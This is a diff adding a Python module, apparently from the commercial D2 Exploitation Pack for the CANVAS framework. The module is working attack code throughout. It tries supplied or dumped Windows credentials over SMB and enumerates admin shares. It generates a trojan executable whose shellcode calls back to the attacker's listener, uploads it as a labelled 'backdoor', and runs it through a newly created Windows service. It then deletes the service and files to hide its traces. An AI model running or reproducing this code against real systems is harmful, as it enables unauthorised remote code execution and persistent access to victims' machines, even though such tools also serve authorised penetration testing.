@@ -1,0 +1,282 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2010
+#
+
+import sys
+sys.path.append(".")
+sys.path.append("../../")
+
+import os
+import getopt
+import socket
+import struct
+import time
+
+from exploitutils import *
+from tcpexploit import *
+import msrpc
+from libs.dcemarshall import *
+import mosdef
+import canvasengine
+from canvasengine import WIN32MOSDEF
+from libs.canvasos import *
+from MOSDEF import pelib
+
+# GUI info
+NAME="D2SEC smbmosdef"
+DESCRIPTION="Run a mosdef trojan via a smb session"
+DOCUMENTATION={}
+DOCUMENTATION["Notes"] = """
+You can provide :
+- a user and a password or a dumped hash (with fgdump for example)
+- a file containing crdentials, for example :
+
+userfoo:passbar
+userbar:dumpedhash
+
+If a file is provided, this module tests sequentially all the credentials
+specified in the file and use the first that is ok.
+
+Then, this module tests all available shares on the target (starting with admin
+shares (ADMIN$, C$, etc.)) and use the first that is ok.
+"""
+
+VERSION="0.1"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Tool"
+PROPERTY['ARCH'] = [ ["Windows", "i386"] ]
+                                                                                
+# defines
+from win32MosdefShellServer import SC_MANAGER_CREATE_SERVICE
+from win32MosdefShellServer import SERVICE_WIN32_OWN_PROCESS
+from win32MosdefShellServer import SERVICE_AUTO_START
+from win32MosdefShellServer import SERVICE_ERROR_IGNORE
+from win32MosdefShellServer import SERVICE_ALL_ACCESS
+from win32MosdefShellServer import SERVICE_BOOT_START
+from win32MosdefShellServer import SERVICE_AUTO_START
+
+class theexploit(tcpexploit):
+  def __init__(self):
+    tcpexploit.__init__(self)
+    self.version = 0
+    self.host = ''
+    self.port = 445
+    self.name = NAME
+    self.msrpcuser = ''
+    self.msrpcpassword = ''
+    self.domain = ''
+    self.serviceName = 'd2sec'
+    self.destbin = 'd2sec_mosdef.exe'
+    self.svcbin = 'd2sec_svc.exe'
+    self.srcbin = os.path.join(os.getcwd(), '3rdparty/D2SEC/exploits/d2sec_smbmosdef', self.destbin)
+    self.svc = os.path.join(os.getcwd(), '3rdparty/D2SEC/exploits/d2sec_smbmosdef', self.svcbin)
+    self.cbackport = 5555
+    self.badstring = '\x00'
+    self.smbobj = None
+    self.gui_update = True
+    self.credentfile = ''
+
+  def gui_hook_function(self):
+    name = ''
+    target = self.engine.target_hosts[0]
+    if target:				
+      ret = target.get_knowledge("DNSName")
+      if ret:
+        name = ret.known													
+    info = [( "domain", name )]
+    return info
+
+  def neededListenerTypes(self):
+    return [canvasengine.WIN32MOSDEF]
+    
+  def getargs(self):
+    self.host = self.target.interface
+    self.port = int(self.argsDict.get("port", self.port))
+    self.msrpcuser = self.argsDict.get("msrpcuser", self.msrpcuser)
+    self.msrpcpassword = self.argsDict.get("msrpcpassword", self.msrpcpassword)
+    self.domain = self.argsDict.get("domain",self.domain)
+    self.cbackport = int(self.argsDict.get("cbackport", self.cbackport))
+    self.credentfile = self.argsDict.get("credentfile", self.credentfile)
+    
+  def maketrojan(self):
+    shellcode = self.createInjectToSelf(self.callback.ip, self.callback.port)
+    myPElib = pelib.PElib()
+    troj = myPElib.createPEFileBuf(shellcode)
+    self.log('[D2] Writing out %d bytes to %s' % (len(troj), self.srcbin))
+    file(self.srcbin, "wb").write(troj)
+
+  def connect_to_share(self, sharename):
+    ret = self.smbobj.treeconnect(sharename)
+    if not ret:
+      self.log('[D2] Failed to connect to share %s!' % sharename)
+      return 0     
+    self.log('[D2] Connected to share %s' % sharename)
+    if not self.smbobj.checkdirectory("\\"):
+      self.log("[D2] Can't check directory on that share. :<")
+    else:
+      self.log('[D2] Checkdirectory \\ passed...')
+    return 1
+
+  def upload_backdoor(self):
+    self.log('[D2] Upload backdoor MOSDEF')
+    ret = self.smbobj.put(self.srcbin, destfilename = self.destbin)
+    if not ret:
+      self.log('[D2] Could not upload file %s!' % self.srcbin)
+      return 0
+    self.log('[D2] Upload generic Windows service')
+    ret = self.smbobj.put(self.svc, destfilename = self.svcbin)
+    if not ret:
+      self.log('[D2] Could not upload file %s!' % self.svc)
+    self.log('[D2] We were able to upload the file and now we must create a new service that points to it')
+    return 1
+    
+  def create_service(self, sharename):
+    scm = None
+    try:
+      scm = self.OpenSCManager(self.host,access=SC_MANAGER_CREATE_SERVICE)
+    except Exception, e:
+      self.log('[D2] Was unable to open SCManager: %s' % e)
+      return None 
+    #set up args for createservice
+    desiredaccess = SERVICE_ALL_ACCESS
+    atype = SERVICE_WIN32_OWN_PROCESS
+    errorcontrol = SERVICE_ERROR_IGNORE
+    #SERVICE_BOOT_START will cause an invalid parameter error, dunno why
+    starttype = SERVICE_AUTO_START
+    binarypath = ''
+    if sharename == 'ADMIN$':
+      binarypath = "%SYSTEMROOT%\\" + self.svcbin + " %SYSTEMROOT%\\" + self.destbin
+    else:
+      binarypath = sharename[0] + ":\\%s" % self.svcbin + " %s"%sharename[0] + ":\\%s" % self.destbin
+    loadorder = 0
+    dependancies = None
+    password = None
+    self.log('[D2] ServiceName=%s DisplayName=%s Binary Path=%s' % (self.serviceName, self.serviceName, binarypath))
+    ret = self.CreateService(scm, self.serviceName, self.serviceName, desiredaccess, atype, starttype, errorcontrol, binarypath, loadorder, dependancies, self.serviceName, password)
+    if ret not in [0,0x431]: #service created/service already existed
+      self.log('[D2] Was unable to call CreateService')
+      return None
+    self.log('[D2] Called create service successfully: %x' % ret)
+    return scm 
+
+  def open_service(self, scm):
+    ret, handler = self.OpenService(scm, self.serviceName, SERVICE_ALL_ACCESS)
+    if ret not in [0]:
+      self.log('[D2] Was unable to call OpenService')
+      return None
+    return handler
+  
+  def start_service(self, handler):
+    ret = self.StartService(handler)
+    self.log('[D2] StartService returned %x' % ret)
+    if ret == 0:
+      self.log('[D2] SUCCESS!')
+    if ret == 0x43b:
+      self.log('[D2] The executable specified in this service has some sort of issue')
+    if ret == 0x420:
+      self.log('[D2] Restart Service')
+      ret = self.StopService(handler)
+      if ret == 0:
+        self.log("SUCCESS!")
+      ret = self.StartService(handler)
+      self.log('[D2] StartService returned %x' % ret)
+
+  def stop_service(self, handler):
+    self.log('[D2] Stop service')
+    ret = self.StopService(handler)
+    if ret == 0:
+      self.log('[D2] SUCCESS !')
+    else:
+      self.log('[D2] Was unable to stop service')
+
+  def delete_service(self, handler):
+    self.log('[D2] Delete service')
+    ret = self.DeleteService(handler)
+    if ret == 0:
+      self.log('[D2] SUCCESS !')
+    else:
+      self.log('[D2] Was unable to delete service')
+
+  def delete_backdoor(self):
+    self.log('[D2] Unlink file %s' % self.svcbin)
+    ret = self.smbobj.unlink(self.destbin)
+    if not ret:
+      self.log('[D2] Could not unlink file %s' % self.svcbin)
+    self.log('[D2] Unlink file %s' % self.destbin)
+    ret = self.smbobj.unlink(self.svcbin)
+    if not ret:
+      self.log('[D2] Could not unlink file %s' % self.destbin)
+
+  def run(self):
+    self.getargs()
+    self.maketrojan()
+
+    self.log('[D2] %s running against %s:%d covertness: %d' % (NAME, self.host, self.port, self.covertness))
+    self.setInfo('[D2] %s attacking %s:%d (Covertness:%d) - running' % (NAME, self.host, self.port, self.covertness))
+
+    listaccount = {} 
+    if self.msrpcuser and self.msrpcpassword:
+      listaccount[self.msrpcuser] = self.msrpcpassword
+    if self.credentfile:
+      lines = open(self.credentfile, 'r').readlines()
+      for line in lines:
+        user, passwd = line[:-1].split(':')
+        listaccount[user] = passwd
+    
+    for user, passwd in listaccount.items():
+      self.msrpcuser = user
+      self.msrpcpassword = passwd
+      self.smbobj = msrpc.SMB(self.host, port=self.port, getsock=self)
+      self.smbobj.covertness = self.covertness
+      self.smbobj.username = self.msrpcuser
+      self.smbobj.password = self.msrpcpassword
+      self.smbobj.domain = self.domain
+      ret = self.smbobj.connect()
+      if not ret:
+        continue
+      self.log('[D2] Using domain=%s user=%s, password=%s' % (self.domain, self.msrpcuser, self.msrpcpassword))
+      sharelist = ["ADMIN$", "C$", "D$", "E$"]
+      shareenum = self.run_module('shareenum')
+      for share in shareenum:
+        name, desc = str(share).split(':')
+        if name not in sharelist:
+          sharelist.append(name)
+      self.log('[D2] Trying to log into %s file share' % (', '.join(sharelist)))
+      for sharename in sharelist:
+        if not self.connect_to_share(sharename): continue
+        if not self.upload_backdoor(): continue
+        scm = self.create_service(sharename)
+        if scm == None:
+          continue
+        handler = self.open_service(scm)
+        if handler == None:
+          continue
+        self.start_service(handler)
+        time.sleep(10)
+        self.stop_service(handler)
+        self.delete_service(handler)
+        self.CloseServiceHandle(handler)
+        self.CloseServiceHandle(scm)			
+        time.sleep(10)
+        os.unlink(self.srcbin)			
+        self.delete_backdoor()
+        time.sleep(10)
+        self.myDCE.close()
+        self.smbobj.s.close()
+        self.log('[D2] Done with exploit')
+        self.setInfo('[D2] %s attacking %s:%d (Covertness:%d) - done' % (NAME, self.host, self.port, self.covertness))
+        return 1
+    self.setInfo('[D2] %s attacking %s:%d (Covertness:%d) - failed' % (NAME, self.host, self.port, self.covertness))
+
+if __name__== '__main__':
+	print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
+	app = theexploit()
+	ret = standard_callback_commandline(app)
+	if ret not in [0,1,None]:
+		ret.interact()
